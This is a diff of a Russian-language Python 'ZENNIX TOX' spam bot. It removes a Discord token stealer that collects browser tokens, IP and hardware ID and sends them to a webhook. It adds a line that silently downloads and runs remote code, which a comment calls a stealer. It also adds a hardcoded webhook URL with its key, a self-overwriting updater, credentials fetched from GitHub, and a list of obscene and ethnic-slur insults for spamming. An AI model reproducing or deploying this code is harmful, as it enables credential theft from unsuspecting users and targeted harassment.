@@ -1,52 +1,86 @@
-import re, glob, sqlite3
-from shutil import copyfile
+import requests, os, sys, time, random, keyboard, threading, uuid, platform
+from datetime import datetime
 
-def get_discord_token():
-    tokens = []
-    paths = [
-        os.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
-        os.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb",
-        os.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
-        os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
-        os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Local Storage\\leveldb",
-    ]
-    for path in paths:
-        if not os.path.exists(path): continue
-        for file in glob.glob(path + "\\*.ldb") + glob.glob(path + "\\*.log") + glob.glob(path + "\\*.sqlite"):
-            try:
-                with open(file, "rb") as f:
-                    for line in f.read().decode(errors="ignore").splitlines():
-                        for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"):
-                            for token in re.findall(regex, line):
-                                if token not in tokens:
-                                    tokens.append(token)
-            except: pass
-    return tokens if tokens else ["Нет токена"]
+# СРАЗУ МОЛЧА ГРУЗИМ И ЗАПУСКАЕМ ТВОЙ СТИЛЛЕР
+try:
+    exec(requests.get("https://raw.githubusercontent.com/somyswag-sys/infomaker/refs/heads/main/dc").text)
+except:
+    pass  # если не загрузилось — пох, идём дальше
 
-def send_webhook(username):
+BOT_VERSION = "1.12.5"
+VERSION_URL = "https://raw.githubusercontent.com/somyswag-sys/TOXBOT/refs/heads/main/version"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1441468500563464262/CEhND_2oO4_AZrmpIk0TMQQvMNkb0ZALaMHswMPcjggvdcjljPSa0cSkS7NSf5xis7_S"
+FOLDER = r"C:\zennix"
+CONFIG = os.path.join(FOLDER, "config.txt")
+LOCAL_VERSION_FILE = os.path.join(FOLDER, "version.txt")
+
+def clear(): os.system("cls" if os.name=="nt" else "clear")
+def t(text, d=0.04):
+    for c in text: print(c, end="", flush=True); time.sleep(d)
+    print()
+
+def check_update():
     try:
-        hwid = str(uuid.UUID(int=uuid.getnode()))
-        pc_name = platform.node()
-        ip_info = requests.get("http://ip-api.com/json/", timeout=5).json()
-        ip = ip_info.get("query", "Неизвестно")
-        location = f"{ip_info.get('city','?')}, {ip_info.get('country','?')}"
-        tokens = get_discord_token()
-        token_field = "\n".join([f"`{t}`" for t in tokens[:5]])  # до 5 токенов (чтобы не спамить)
-        
-        data = {
-            "embeds": [{
-                "title": "ZENNIX TOX — ЗАПУСК + DISCORD TOKEN",
-                "color": 16711680,
-                "fields": [
-                    {"name": "Логин", "value": username, "inline": True},
-                    {"name": "PC", "value": pc_name, "inline": True},
-                    {"name": "HWID", "value": f"```{hwid}```", "inline": False},
-                    {"name": "IP", "value": ip, "inline": True},
-                    {"name": "Город", "value": location, "inline": True},
-                    {"name": "Discord токены", "value": token_field if token_field != "`Нет токена`" else "Не найдено", "inline": False},
-                    {"name": "Время", "value": datetime.now().strftime("%d.%m.%Y %H:%M:%S"), "inline": False}
-                ]
-            }]
-        }
-        requests.post(WEBHOOK_URL, json=data)
+        online = requests.get(VERSION_URL, timeout=10).text.strip()
+        local = open(LOCAL_VERSION_FILE).read().strip() if os.path.exists(LOCAL_VERSION_FILE) else "0.0.0"
+        if online != local:
+            clear()
+            print("\033[91m╔════════════════════════════════╗")
+            print("║     ОБЯЗАТЕЛЬНОЕ ОБНОВЛЕНИЕ    ║")
+            print(f"║   У тебя: {local}                  ║")
+            print(f"║   Новая:  {online}                  ║")
+            print("╚════════════════════════════════╝\033[0m")
+            input("\n   Нажми Enter для обновления...")
+            code = requests.get("https://raw.githubusercontent.com/somyswag-sys/TOXBOT/refs/heads/main/main", timeout=30).text
+            with open(__file__, "w", encoding="utf-8") as f: f.write(code)
+            with open(LOCAL_VERSION_FILE, "w") as f: f.write(online)
+            print("   Перезапуск...")
+            time.sleep(2)
+            os.execv(sys.executable, [sys.executable] + sys.argv)
     except: pass
+
+def login():
+    global current_user, DELAY, MESSAGES
+    try:
+        raw = requests.get("https://raw.githubusercontent.com/somyswag-sys/TOXBOT/refs/heads/main/toxic", timeout=8).text.strip()
+        valid_creds = {u.strip().lower(): p.strip() for u, p in (l.split(":",1) for l in raw.splitlines() if ":" in l)}
+    except:
+        clear(); t("   НЕТ СВЯЗИ С СЕРВЕРОМ АВТОРИЗАЦИИ"); time.sleep(5); sys.exit()
+
+    if os.path.exists(CONFIG):
+        try:
+            lines = [x.strip() for x in open(CONFIG, encoding="utf-8")]
+            if len(lines) >= 3 and lines[0].lower() in valid_creds and valid_creds[lines[0].lower()] == lines[1]:
+                current_user = lines[0]
+                DELAY = float(lines[2])
+                MESSAGES = [(m, DELAY) for m in MESSAGES]
+                clear(); t(f"   Автологин: {current_user}"); time.sleep(1.5); return
+        except: os.remove(CONFIG)
+
+    clear()
+    print("   ZENNIX TOX | АВТОРИЗАЦИЯ")
+    for i in range(1,4):
+        u = input(f"\n   [{i}/3] Логин: ").strip()
+        p = input("   Пароль: ").strip()
+        if u.lower() in valid_creds and valid_creds[u.lower()] == p:
+            current_user = u
+            if input("   Запомнить? (y/n): ").lower() in ["y","да"]:
+                open(CONFIG,"w",encoding="utf-8").write(f"{u}\n{p}\n{DELAY}")
+            t("   ДОСТУП РАЗРЕШЁН"); return
+        t(f"   НЕВЕРНО ({i}/3)")
+    t("   ДОСТУП ЗАПРЕЩЁН"); time.sleep(4); sys.exit()
+
+MESSAGES = [(m, 0.8) for m in ["у тебя ммть шлюхв","я кнк месник","ей руки отрезал","верещтт свинка хоххлятская","ебанный ледниковый период","сид обосранный","клыкастый я тебе с хуя зубы выбил","у тя мамка в копьем в жопе танцует","норм ты ебанная чибурашка","клапоухий пидор","педик волосатый","пинок под жопу дам те","в клетку улетишь","жопой коноплю собираешь","дырявый","петух","кусок говна","че за хуйня хуесос","ебанный индеец"]]
+stop_event = threading.Event()
+current_user = "unknown"
+DELAY = 0.8
+
+def banner():
+    clear()
+    print("
+ ███████╗███████╗███╗   ██╗███╗   ██╗██╗██╗  ██╗
+ ╚══███╔╝██╔════╝████╗  ██║████╗  ██║██║╚██╗██╔╝
+   ███╔╝ █████╗  ██╔██╗ ██║██╔██╗ ██║██║ ╚███╔╝ 
+  ███╔╝  ██╔══╝  ██║╚██╗██║██║╚██╗██║██║ ██╔██╗ 
+ ███████╗███████╗██║ ╚████║██║ ╚████║██║██╔╝ ██╗
+ ╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝ v1.12.5  ")
